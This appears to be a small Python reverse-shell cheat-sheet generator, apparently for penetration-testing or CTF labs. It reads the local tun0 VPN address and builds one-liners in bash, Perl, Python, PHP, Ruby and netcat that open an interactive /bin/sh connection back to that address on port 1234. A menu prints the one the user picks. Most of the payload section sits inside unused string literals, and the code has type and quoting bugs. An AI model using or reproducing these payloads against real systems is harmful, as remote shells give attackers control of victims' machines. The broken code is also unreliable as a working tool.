# Written in Python 3 by @Swafox
# CH Credit: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
import os

# Setting colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

# Example: print(f"{bcolors.WARNING}Warning: No active frommets remain. Continue?{bcolors.ENDC}")
# print(f"{bcolors.BOLD}Testing this feature")
# ip a show tun0 | grep -qoE "10\.(2|4|6|8|9|11)\.[0-9]{1,3}\.[0-9]{1,3}" | head -1
# ip a show tun0

# ip address | grep -sw "inet" | cut -d " " -f 6 | grep 10.*

# Getting the tun0
def pull_tun0():
    osout  = str(os.popen("ip a show tun0").read())
    return osout.splitlines()

tun0 = pull_tun0()
#print("tun0 IP:" + tun0)
print("Port: 1234")

# CheatSheet
'''
# Bash
bash = "bash -i >& /dev/tcp/"+tun0+"/1234 0>&1"

# PERL
perl = "perl -e 'use Socket;$i="+tun0+""";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

# Python
python = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+tun0+""",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """

# PHP
php = "php -r '$sock=fsockopen("+tun0+""",1234);exec("/bin/sh -i <&3 >&3 2>&3");'"""

# Ruby
ruby = "ruby -rsocket -e'f=TCPSocket.open("+tun0+""",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

# Netcat
netcat = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+tun0+" 1234 >/tmp/f"

# Java
'''

# Cosmetics & Input 
'''
print(f"{bcolors.HEADER}Reverse Shell Cheat Sheet\n")
lang = input().lower()
if (lang == "bash"):
    print(bash)
elif (lang == "perl"):
    print(perl)
elif (lang == "python"):
    print(python)
elif (lang == "php"):
    print(php)
elif (lang == "ruby"):
    print(ruby)
elif (lang == "netcat" or lang == "nc"):
    print(netcat)
else:
    print("Sorry! Could not recognize your input")
'''
